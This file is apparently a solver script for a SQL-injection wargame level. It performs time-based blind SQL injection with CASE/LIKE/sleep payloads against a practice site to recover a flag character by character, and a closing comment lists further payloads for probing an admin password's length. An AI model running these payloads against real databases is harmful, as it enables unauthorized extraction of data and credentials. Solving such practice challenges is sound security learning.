import requests
import time
import timeit
from bs4 import BeautifulSoup
import requests.packages.urllib3

requests.packages.urllib3.disable_warnings()

def Auth():
    sess = requests.Session()
    url = 'https://los.eagle-jump.org/?login'
    data = {"id": "", "pw": ""} #credentials deleted
    sess.post(url, data = data)
    return sess

def checkSuccess(text,elapse_time):
    if(text != "\n"):
        print(text)
        exit()
    return elapse_time>5

def test(sess,url):
    injection =  "flag=(case when (flag like 'a%') and sleep(5) then 1 else (select 1 union select 2) end)"
    t0 = timeit.default_timer()
    html = sess.get(url+injection, verify=False)
    print(html.text)
    print(html.text == "")
    elapse_time = timeit.default_timer() - t0
    print(elapse_time)

def checkForbiden(guess): #check "," , "." , "_"
    return guess == 44 or guess == 46 or guess == 95

def checkWildcard(guess): #check '%'
    return guess == 37

sess = Auth()
url = "https://los.eagle-jump.org/umaru_6f977f0504e56eeb72967f35eadbfdf5.php?"
#test(sess,url)

ans = ""
index = 13
guess = 0
while index < 16+1:
    for guess in range(32,127):
        if(checkForbiden(guess)):    continue
        if(checkWildcard(guess)):    continue
        
        injection =  "flag=(case when (flag like '%FA"+ans+chr(guess)+"%') and sleep(5) then 1 else (select 1 union select 2) end)"
        if(len(injection) > 99):
            exit()
    
        t0 = timeit.default_timer()
        html = sess.get(url+injection, verify=False)
        elapse_time = timeit.default_timer() - t0
        print(elapse_time," ",ans+chr(guess))
        if(checkSuccess(html.text,elapse_time)):
            print('find',index," ",chr(guess))
            ans = ans + chr(guess)
            break
        time.sleep(0.3)
    index = index + 1
print(ans)

'''
notice: 'like' statement is case insensitive, be aware of whether the flag check is case sensitive or not 
example payload:
injection = "(case when (flag like '%') and sleep(5) then 1 else (select 1 union select 2) end)"
injection = "pw=' or (id='admin' and (select 1 union (select length(pw)>8))) %23"
injection = "pw=1' or (id='admin' and if(length(pw)>15,(select 2 union select 1),0)) %23"
'''